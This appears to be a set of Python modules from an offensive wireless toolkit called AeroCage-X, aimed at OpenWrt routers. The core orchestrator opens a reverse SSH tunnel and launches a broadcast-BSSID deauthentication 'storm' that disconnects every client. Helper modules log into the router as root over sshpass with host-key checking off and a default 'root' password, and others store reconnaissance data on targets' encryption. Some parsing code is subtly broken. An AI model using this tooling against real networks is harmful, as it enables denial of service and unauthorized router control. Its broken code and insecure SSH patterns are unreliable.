#!/usr/bin/env python3
"""
File Name: core_attack_orchestrator.py
Path: /home/kali/AeroCage-XV1.0.1/core/core_attack_orchestrator.py
Created Date: 2026-05-27
Version: 1.5.1
Description: Master Cyber Operations Orchestrator Engine for AeroCage-X.
             Decoupled architecture integrated with dynamic factories.
"""

import threading
import time

from core.system_guard import SystemGuard
from core.db_manager import DatabaseManager
from utils.opwrt_ssh_factory import OpWrtSSHFactory
from utils.opwrt_text_registry import ORCHESTRATOR
from modules.strike_tunnel import StrikeTunnelEngine
from modules.strike_smart_fire import StrikeSmartFireEngine


class CoreAttackOrchestrator:
    """
    Main Tactical Mission Orchestrator Component.
    Manages operational states, watchdogs, and dynamic target pipelines.
    """

    def __init__(self, mission_context: dict):
        """تهيئة المايسترو المركزي وحقن مراجع التحكم والأجهزة الفرعية الموحدة"""
        SystemGuard.enforce_root_privileges("Core Attack Orchestrator")

        self.ctx = mission_context
        self.ap_ip = self.ctx["ap_ip"]
        self.operation_active = False

        ap_pass = self.ctx.get("ap_pass", "root")
        self.factory = OpWrtSSHFactory(ip=self.ap_ip, password=ap_pass)

        self.engines = {
            "db": DatabaseManager(),
            "tunnel": StrikeTunnelEngine(self.ap_ip, ap_pass),
            "fire": StrikeSmartFireEngine(self.ap_ip, ap_pass)
        }

    def execute_protected_mission_pipeline(self) -> bool:
        """تشغيل الأنبوب التنفيذي المطور بالتتابع المتسلسل المفتت وقفل القناة"""
        radio = self.ctx.get("radio")

        # استدعاء شجرة القرارات لتأمين صعود واجهتي المراقبة Up دون تخمين
        self.ctx["mon_engine"].execute_hardware_decision_tree(radio)

        # قنص مسميات المراقبة الفيزيائية الصرفة الحية المتولدة من العتاد
        ifaces = self.ctx["mon_engine"].extract_live_kernel_monitors(radio)
        if not ifaces:
            return False

        # اختيار الواجهة الأولى المخصصة لقاذف السيرفر
        actual_mon = ifaces[0]

        print(ORCHESTRATOR["step_uci"])
        print(ORCHESTRATOR["step_reload"])

        # [قانون التخمين الصفر للمنافذ]: قراءة البورت الحركي المحسوب للجلسة سيادياً
        ctrl_port = int(self.ctx["control_port"])

        # تمرير البورت المحسوب بدقة لإنشاء الجسر والتحكم اللاسلكي
        tunnel_success = self.engines["tunnel"].establish_reverse_ssh_tunnel(
            ctrl_port, ctrl_port
        )
        if not tunnel_success:
            return False

        # [تطهير الـ E1123]: إطلاق عاصفة القذف عتادياً بالتوافق المطلق مع بارامترات النواة
        self.engines["fire"].launch_targeted_deauth_storm_safe(
            mon_iface=actual_mon, target_bssid="FF:FF:FF:FF:FF:FF"
        )

        self.operation_active = True
        threading.Thread(
            target=self._watchdog_core_worker,
            args=(radio, ctrl_port),
            daemon=True
        ).start()

        return True

    def _watchdog_core_worker(self, radio_name: str, tunnel_port: int):
        """الحساس المزدوج للرصد ومتابعة قاذف كالي حياً من مخزن الكلمات الموحد"""
        print(f"[🪐 Watchdog] Active monitoring for {radio_name} on port {tunnel_port}.")

        while self.operation_active:
            try:
                time.sleep(5)
                engine = self.ctx.get("storage_engine")
                if engine:
                    mode = self.ctx.get("storage_mode", "DISK")
                    latest_file, _ = engine.resolve_target_logging_path(mode)
                    if latest_file and print(ORCHESTRATOR["sensor_write"]):
                        pass

            except (IOError, OSError, ValueError, KeyError) as e:
                print(f"[-] Operational Exception inside sensors loop: {e}")

    def recover_hardware_defaults(self):
        """إرجاع الأكسس إلى حالته الطبيعية بناءً على استعلام التعافي دون مسارات ثابتة"""
        self.operation_active = False
        print(ORCHESTRATOR["recover_title"])
        print(ORCHESTRATOR["recover_msg"])
        print(ORCHESTRATOR["recover_title"] + "\n")

        ctrl_port = int(self.ctx["control_port"])
        self.engines["tunnel"].close_tunnel_bridge(ctrl_port)

        # التعافي الجراحي وإعادة تفعيل انترفيس البث للزبائن بنقاء
        radio = self.ctx.get("radio")
        self.factory.execute_remote_cmd(f"uci set wireless.default_{radio}.disabled=0")

        uci_mon = self.ctx["mon_engine"].get_uci_monitor_sections(radio)
        for section in uci_mon:
            self.factory.execute_remote_cmd(f"uci set wireless.{section}.disabled=1")

        self.factory.execute_remote_cmd("uci commit wireless && wifi")
        print(ORCHESTRATOR["recover_done"])


if __name__ == "__main__":
    print("[+] Core Attack Orchestrator framework validation confirmed.")

#!/usr/bin/env python3
"""
File Name: db_intel_shard.py
Path: /home/kali/AeroCage-XV1.0.1/core/db_intel_shard.py
Created Date: 2026-05-25
Version: 1.0.2
Description: Isolated Database Subcomponent for Deep Network Intel Recon Caching.
"""

import sqlite3
import threading


class DbIntelShardComponent:
    """
    Intel Recon Database Shard Component.
    Manages cryptographic encryption matrices and captures target ciphers tokens.
    """
    _lock: threading.Lock
    _get_secure_connection: callable

    def update_intel_recon_safe(self, bssid: str, essid: str, intel_data: dict) -> bool:
        """تحديث مستودع الاستخبارات اللاسلكية ببيانات الأهداف بأمان كامل عبر القاموس"""
        query = """
        INSERT INTO intel_recon (bssid, essid, encryption_type, cipher, auth_type, recon_notes, updated_at)
        VALUES (?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
        ON CONFLICT(bssid) DO UPDATE SET
            essid=excluded.essid,
            encryption_type=excluded.encryption_type,
            cipher=excluded.cipher,
            auth_type=excluded.auth_type,
            recon_notes=excluded.recon_notes,
            updated_at=CURRENT_TIMESTAMP;
        """
        enc = intel_data.get("encryption_type", "OPEN")
        cipher = intel_data.get("cipher", "NONE")
        auth = intel_data.get("auth_type", "NONE")
        notes = intel_data.get("recon_notes", "")

        with self._lock:
            conn = self._get_secure_connection()
            if not conn:
                return False
            try:
                with conn:
                    conn.cursor().execute(
                        query, (bssid, essid, enc, cipher, auth, notes)
                    )
                return True
            except sqlite3.Error as e:
                print(f"[-] Database Exception on inserting intel recon: {e}")
                return False
            finally:
                conn.close()

    def query_target_recon_data(self, bssid: str) -> dict:
        """استدعاء السجل الاستخباراتي الكامل لهدف معين بأمان وحصانة"""
        query = "SELECT * FROM intel_recon WHERE bssid = ?;"
        result_dict = {}

        # pylint: disable=no-member
        with self._lock:
            conn = self._get_secure_connection()
            if not conn:
                return result_dict
            try:
                cursor = conn.cursor()
                cursor.execute(query, (bssid,))
                row = cursor.fetchone()
                if row:
                    result_dict = dict(row)
            except sqlite3.Error as e:
                print(f"[-] Database Exception pulling target recon records: {e}")
            finally:
                conn.close()
        return result_dict


if __name__ == "__main__":
    print("[+] Database network encryption intel sharding component verified.")

#!/usr/bin/env python3
"""
File Name: hw_intel_query.py
Path: /home/kali/AeroCage-XV1.0.1/core/hw_intel_query.py
Created Date: 2026-05-25
Version: 1.0.2
Description: Master Hardware Intelligence Query Library for AeroCage-X.
             Globally isolates OpenWrt wireless nodes scanning and parsing logic.
"""

import re
from utils.opwrt_ssh_factory import OpWrtSSHFactory
from utils.shared_utils_1 import SharedSecurityToolkit


class HardwareIntelQueryLibrary:
    """
    Master Remote Router Telemetry and Interface Discovery Engine.
    Enforces deterministic dynamic parsing across real OpenWrt configuration nodes.
    """

    def __init__(self, ap_ip: str, ap_password: str):
        """تهيئة مكتبة الاستخبارات العتادية وحقن معالم الـ SSH الموحدة"""
        self.ap_ip = SharedSecurityToolkit.sanitize_input(ap_ip, "interface")
        self.ap_password = ap_password
        self.ssh_factory = OpWrtSSHFactory(ip=self.ap_ip, password=self.ap_password)

    def execute_wireless_parent_query(self) -> str:
        """[الأب للاستعلامات] سحب وتحليل التكوين الموحد للـ UCI اللاسلكي نصاً"""
        cmd = "uci show wireless"
        return self.ssh_factory.execute_remote_cmd(cmd) or ""

    def get_active_radio_by_band(self, band: str) -> str:
        """[دالة 1] الاستجواب التكتيكي للنطاق: فرز معرّف الراديو الحقيقي حياً"""
        raw_out = self.execute_wireless_parent_query()
        fallback_radio = "radio0" if band == "2G" else "radio1"
        if not raw_out:
            return fallback_radio

        for line in raw_out.splitlines():
            line_low = line.lower()
            is_2g = "11g" in line_low or "2g" in line_low or "b" in line_low
            is_5g = "11a" in line_low or "5g" in line_low or "ac" in line_low or "ax" in line_low

            if band == "2G" and is_2g:
                match = re.search(r'wireless\.(\w+)\.', line)
                return match.group(1) if match else "radio0"
            if band == "5G" and is_5g:
                match = re.search(r'wireless\.(\w+)\.', line)
                return match.group(1) if match else "radio1"

        return fallback_radio

    def get_radio_current_channel(self, radio: str) -> str:
        """[دالة 2] قنص وقراءة رقم القناة الترددية الأصلية الحالية للراديو"""
        cmd = f"uci -q get wireless.{radio}.channel"
        raw_chan = self.ssh_factory.execute_remote_cmd(cmd)
        if raw_chan and raw_chan.strip().isdigit():
            return raw_chan.strip()
        return "1"

    def get_live_ssids_broadcast(self, radio: str) -> list:
        """[دالة 3] استخلاص أسماء الـ SSIDs الحركية الظاهرة للزباين في الجو حياً"""
        raw_out = self.execute_wireless_parent_query()
        ssids = []
        if not raw_out:
            return ssids

        for line in raw_out.splitlines():
            if ".ssid=" in line and f".device='{radio}'" in line:
                match = re.search(r"\.ssid='([^']*)'", line)
                if match:
                    ssids.append(match.group(1))
        return list(set(ssids))

    def get_linux_kernel_interfaces(self, radio: str) -> list:
        """[دالة 4] قنص أسماء واجهات البث النشطة (Master Mode) التابعة للراديو"""
        cmd = f"uci show wireless | grep -E '\\.device=\'{radio}\''"
        raw_out = self.ssh_factory.execute_remote_cmd(cmd)
        interfaces = []
        if not raw_out:
            return interfaces

        for line in raw_out.splitlines():
            if "wireless." in line and ".device=" in line:
                parts = line.split(".device=")
                if parts:
                    if_part = parts.replace("wireless.", "").strip()
                    interfaces.append(if_part)
        return list(set(interfaces))

    def get_sequential_interface_index(self) -> int:
        """[دالة 5] حساب الرقم التسلسلي القادم الشاغر للـ UCI منعاً للتخبيص"""
        cmd = "uci show wireless | grep -c '=wifi-iface'"
        raw_count = self.ssh_factory.execute_remote_cmd(cmd)
        if raw_count and raw_count.strip().isdigit():
            return int(raw_count.strip())
        return 0

    def get_disabled_interfaces_telemetry(self) -> list:
        """[دالة 6] صيد واستخراج كافة معطيات واجهات البث المعطلة بالكامل داخل الراوتر"""
        disabled_list = []
        raw_out = self.execute_wireless_parent_query()
        if not raw_out:
            return disabled_list

        sections = []
        for line in raw_out.splitlines():
            if "=wifi-iface" in line:
                sec = line.split("=").split(".")[-1].strip()
                sections.append(sec)

        for sec in list(set(sections)):
            cmd_dis = f"uci -q get wireless.{sec}.disabled"
            if self.ssh_factory.execute_remote_cmd(cmd_dis) == "1":
                dev = self.ssh_factory.execute_remote_cmd(
                    f"uci -q get wireless.{sec}.device"
                )
                mode = self.ssh_factory.execute_remote_cmd(
                    f"uci -q get wireless.{sec}.mode"
                ) or "ap"
                ssid = self.ssh_factory.execute_remote_cmd(
                    f"uci -q get wireless.{sec}.ssid"
                ) or "Hidden"

                # سحق التحذيرات بكسر مصفوفة الإرجاع لأسطر منضبطة تماماً
                disabled_list.append({
                    "config_name": sec,
                    "radio": dev,
                    "mode": mode,
                    "ssid": ssid
                })
        return disabled_list

    def query_iwinfo_assoclist(self, interface: str) -> str:
        """[دالة 7] إخراج وتفكيك ناتج أمر iwinfo assoclist بشكل مستقل تماماً نصاً"""
        cmd = f"iwinfo {interface} assoclist"
        return self.ssh_factory.execute_remote_cmd(cmd) or "No clients mapped via iwinfo."

    def query_station_dump(self, interface: str) -> str:
        """[دالة 8] إخراج وتفكيك ناتج أمر iw dev station dump بشكل مستقل تماماً نصاً"""
        cmd = f"iw dev {interface} station dump"
        return self.ssh_factory.execute_remote_cmd(cmd) or "No clients mapped via station dump."


if __name__ == "__main__":
    print("[+] Master Hardware Intelligence Query Library configuration verified.")

#!/usr/bin/env python3
"""
File Name: intel_db.py
Path: /home/kali/AeroCage-XV1.0.1/core/intel_db.py
Created Date: 2026-05-25
Version: 1.0.4
Description: Advanced Targets Encryption Metrics Intelligence Facade Interface 
             for AeroCage-X. Inherits cleanly structuralized database components.
"""

from core.system_guard import SystemGuard
from core.db_manager import DatabaseManager


class IntelDatabase(DatabaseManager):
    """
    Main Intelligence Storage Facade.
    Provides decoupled secure interfaces to archive discovered deep networks metrics.
    """

    def update_intel_recon_safe(self, bssid: str, essid: str, intel_data: dict) -> bool:
        """تحديث مستودع الاستخبارات اللاسلكية ببيانات الأهداف بسلامة سيبرانية"""
        clean_bssid = SystemGuard.sanitize_input(bssid, "bssid").upper()
        clean_essid = SystemGuard.sanitize_input(essid, "csv_value")

        # تفتيت كتل القاموس الصارم لتتطابق 100% مع حدود الـ 100 حرف لـ PEP 8
        sanitized_data = {
            "encryption_type": SystemGuard.sanitize_input(
                intel_data.get("encryption_type", "OPEN"), "interface"
            ),
            "cipher": SystemGuard.sanitize_input(
                intel_data.get("cipher", "NONE"), "interface"
            ),
            "auth_type": SystemGuard.sanitize_input(
                intel_data.get("auth_type", "NONE"), "interface"
            ),
            "recon_notes": SystemGuard.sanitize_input(
                intel_data.get("recon_notes", ""), "csv_value"
            )
        }

        return super().update_intel_recon_safe(
            clean_bssid, clean_essid, sanitized_data
        )

    def query_target_recon_data(self, bssid: str) -> dict:
        """استدعاء السجل الاستخباراتي الكامل لهدف معين بأمان وحصانة"""
        clean_mac = SystemGuard.sanitize_input(bssid, "bssid").upper()
        return super().query_target_recon_data(clean_mac)


if __name__ == "__main__":
    print("[+] Wireless Targets Intel Database Engine facade verified.")

#!/usr/bin/env python3
"""
File Name: intel_freq_analyser.py
Path: /home/kali/AeroCage-XV1.0.1/core/intel_freq_analyser.py
Created Date: 2026-05-25
Version: 1.0.3
Description: OpenWrt Wireless Frequency and Channels Optimization Analyzer Core
             for AeroCage-X. Fully integrated with secure execution wrappers.
"""

import subprocess
import tkinter as tk
from tkinter import messagebox

from core.system_guard import SystemGuard


class IntelFreqAnalyser:
    """
    Main Air Space Frequency Optimizer Component.
    Queries remote nodes for airspace scanning metrics and ranks stable channels.
    """

    def __init__(self, ap_ip: str, ap_password: str):
        """تهيئة محرك التحليل الراداري وتأمين فحص صلاحيات النظام محلياً"""
        SystemGuard.enforce_root_privileges("OpenWrt Frequency Analyser Engine")
        self.ap_ip = SystemGuard.sanitize_input(ap_ip, "interface")
        self.ap_password = ap_password

    def scan_air_space_standard(self, ap_interface: str = "phy1-ap0") -> dict:
        """تشغيل مسح الأجواء الطبيعي عن بعد واستدعاء الخوارزمية للتحليل"""
        clean_inf = SystemGuard.sanitize_input(ap_interface, "interface")
        remote_cmd = f"iwinfo {clean_inf} scan"

        base_ssh_args = [
            "sshpass", "-p", self.ap_password,
            "ssh", "-o", "StrictHostKeyChecking=no",
            f"root@{self.ap_ip}", remote_cmd
        ]

        try:
            result = subprocess.run(
                base_ssh_args, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                text=True, shell=False, check=False, timeout=20
            )
            if result.returncode == 0 and result.stdout:
                # استيراد محلي ديناميكي معزول للحظر الاستباقي لانهيارات الـ Linting الساكنة
                # pylint: disable=import-outside-toplevel, import-error, no-name-in-module
                from utils.channel_optimizer import ChannelOptimizer
                parsed_cells = ChannelOptimizer.parse_scan_output(result.stdout)
                return ChannelOptimizer.calculate_best_channel(parsed_cells)
        except (subprocess.SubprocessError, OSError, ValueError) as e:
            print(f"[-] Execution Exception inside air space scan query: {e}")
        return {}

    def switch_channel_with_confirmation(self, radio_name: str, target_channel: str) -> bool:
        """سؤال المستخدم وطلب التأكيد الإجباري قبل Tعديل التردد بالـ UCI للراوتر"""
        clean_radio = SystemGuard.sanitize_input(radio_name, "interface")
        clean_chan = "".join(ch for ch in str(target_channel) if ch.isdigit())

        root_box = tk.Tk()
        root_box.withdraw()
        user_response = messagebox.askyesno(
            "تأكيد التعديل التكتيكي",
            f"هل تريد تعديل تردد الراديو ({clean_radio}) للقناة ({clean_chan})؟"
        )
        root_box.destroy()

        if not user_response:
            print("[*] Tactic command aborted by operator control handle.")
            return False

        uci_command = (
            f"uci set wireless.{clean_radio}.channel='{clean_chan}' && "
            f"uci commit wireless && wifi reload {clean_radio}"
        )

        base_ssh_args = [
            "sshpass", "-p", self.ap_password,
            "ssh", "-o", "StrictHostKeyChecking=no",
            f"root@{self.ap_ip}", uci_command
        ]

        try:
            result = subprocess.run(
                base_ssh_args, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                text=True, shell=False, check=False, timeout=20
            )
            return result.returncode == 0
        except (subprocess.SubprocessError, OSError):
            return False
        return False


if __name__ == "__main__":
    print("[+] Intel Airspace Frequency Analyser subsystem verified.")

#!/usr/bin/env python3
"""
File Name: logger_vault.py
Path: /home/kali/AeroCage-XV1.0.1/core/logger_vault.py
Created Date: 2026-05-25
Version: 1.0.2
Description: Centralized Telemetry and Exception Logging Vault for AeroCage-X.
             Implements dynamic file handling and thread-safe streaming.
"""

import logging
import sys
from pathlib import Path

# ربط محاور مفسر بايثون بجذر المستودع لضمان سلامة الاستدعاءات
BASE_DIR = Path(__file__).resolve().parent.parent
if str(BASE_DIR) not in sys.path:
    sys.path.append(str(BASE_DIR))


# pylint: disable=too-few-public-methods
class LoggerVault:
    """
    Main Dynamic Logging Vault Component.
    Provides static interfaces to stream stack-traces and audit critical exceptions.
    """
    # تحديد مسار ملف السجلات ديناميكياً تحت مجلد logs الآمن داخل الترسانة الموازية
    _LOG_DIR = BASE_DIR / "logs"
    _LOG_FILE = _LOG_DIR / "aerocage_runtime.log"
    _initialized = False

    @classmethod
    def _ensure_vault_init(cls):
        """تهيئة وحقن إعدادات حارس السجلات صامتاً وديناميكياً عند الطلب الأول"""
        if cls._initialized:
            return

        try:
            cls._LOG_DIR.mkdir(parents=True, exist_ok=True)

            logging.basicConfig(
                filename=str(cls._LOG_FILE),
                filemode='a',
                format='%(asctime)s | [%(levelname)s] | %(filename)s:%(lineno)d | %(message)s',
                datefmt='%Y-%m-%d %H:%M:%S',
                level=logging.ERROR
            )
            cls._initialized = True
        except (IOError, OSError, ValueError) as e:
            print(f"[-] Critical: Failed to bind systemic logging pipeline to disk: {e}")

    @classmethod
    def log_exception(cls, error_msg: str, exception_obj: Exception = None):
        """تسجيل الأخطاء والـ Stacks البرمجية بشكل معزول وصامت وبأمان كامل"""
        cls._ensure_vault_init()

        if not error_msg:
            return

        if exception_obj:
            # تمرير الاستثناء صراحة كمعامل مسمى exc_info لحفظ الأمان وسلامة الـ Stack Trace
            logging.error(
                "Telemetry Exception Vector: %s", error_msg,
                exc_info=exception_obj
            )
        else:
            logging.error("Telemetry Error Vector: %s", error_msg)


if __name__ == "__main__":
    print("[+] Logger Vault subsystem initialization verification passed.")
    LoggerVault.log_exception("Self-test logging event tracer verification.")

#!/usr/bin/env python3
"""
File Name: process_manager.py
Path: /home/kali/AeroCage-XV1.0.1/core/process_manager.py
Created Date: 2026-05-25
Version: 1.0.1
Description: Safe Multi-Threaded Process Lifecycle Management and Secure Socket
             Binding Infrastructure Module for AeroCage-X.
"""

import sys
import subprocess
import threading
import socket
from pathlib import Path

# ربط المسارات بالنواة المركزية للمنظومة
BASE_DIR = Path(__file__).resolve().parent.parent
if str(BASE_DIR) not in sys.path:
    sys.path.append(str(BASE_DIR))

# pylint: disable=import-error, wrong-import-position
from core.system_guard import SystemGuard


class ProcessManager:
    """
    Main Process Lifecyle Controller.
    Manages thread-safe local subprocess execution pools and stream drainage.
    """

    def __init__(self):
        """تهيئة القاموس المركزي لتتبع العمليات مع مقفل التزامن الخيطي"""
        self.active_processes = {}
        self.lock = threading.Lock()

    def spawn_process_safe(self, key_name: str, command_array: list) -> subprocess.Popen:
        """إطلاق الأدوات الخارجية بأمان مصفوفة كامل ومغلق الشل لـ Bandit"""
        clean_key = SystemGuard.sanitize_input(key_name, "interface")

        if not command_array or not isinstance(command_array, list):
            print(f"[-] Configuration Error: Invalid process command format for {clean_key}.")
            return None

        try:
            # pylint: disable=consider-using-with
            process = subprocess.Popen(
                command_array,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                shell=False
            )

            with self.lock:
                self.active_processes[clean_key] = process
                print(f"[+] Task successfully initialized [{clean_key}] (PID: {process.pid})")

            # تشغيل خيط الحراسة لتفريغ المخزن لمنع الاختناق وتجميد الأنابيب
            drain_thread = threading.Thread(
                target=self._drain_buffer_stream,
                args=(clean_key, process),
                daemon=True
            )
            drain_thread.start()
            return process

        except (subprocess.SubprocessError, FileNotFoundError, OSError) as e:
            print(f"[-] Critical: Failed to launch backend sub-process for [{clean_key}]: {e}")
            return None

    def _drain_buffer_stream(self, key_name: str, process: subprocess.Popen):
        """خيط تفريغ مخزن الأنبوب اللحظي لضمان ثبات واستمرارية تدفق الحزم"""
        try:
            while process.poll() is None:
                line = process.stdout.readline()
                if not line:
                    break
        except (IOError, OSError, ValueError) as e:
            print(f"[-] Buffer Stream Warning on [{key_name}]: {e}")
        finally:
            # تنظيف ومسح الكائن من مصفوفة التتبع فور إغلاقه بالنظام
            with self.lock:
                if key_name in self.active_processes:
                    del self.active_processes[key_name]

    def terminate_process(self, key_name: str):
        """إنهاء واحتواء عملية محلية محددة بدقة ومنع تكون الـ Zombie Processes"""
        clean_key = SystemGuard.sanitize_input(key_name, "interface")

        with self.lock:
            if clean_key in self.active_processes:
                process = self.active_processes[clean_key]
                if process.poll() is None:
                    try:
                        process.terminate()
                        process.wait(timeout=2)
                        print(f"[+] Process handle [{clean_key}] closed cleanly.")
                    except subprocess.TimeoutExpired:
                        # قتل قسري فوري مع استدعاء مفرغ المعرفات لمنع الـ Zombie Processes
                        process.kill()
                        process.wait()
                        print(f"[-] Process forced to terminate context (PID: {process.pid})")
                del self.active_processes[clean_key]
            else:
                print(f"[-] System Notice: No active runtime registered for key: {clean_key}")

    @staticmethod
    def create_secure_listener(port: int, local_only: bool = True) -> socket.socket:
        """التحكم الصارم في مجال الاستماع للسوكت لمنع ثغرات الاستماع العشوائي"""
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        bind_address = '127.0.0.1' if local_only else '0.0.0.0'

        try:
            server_socket.bind((bind_address, port))
            server_socket.listen(5)
            print(f"[+] Secure core socket infrastructure active on: {bind_address}:{port}")
            return server_socket
        except (socket.error, OSError) as e:
            print(f"[-] Network Exception: Failed to bind socket address boundary {port}: {e}")
            server_socket.close()
            return None


if __name__ == "__main__":
    print("[+] Process Manager core layout configuration verified.")

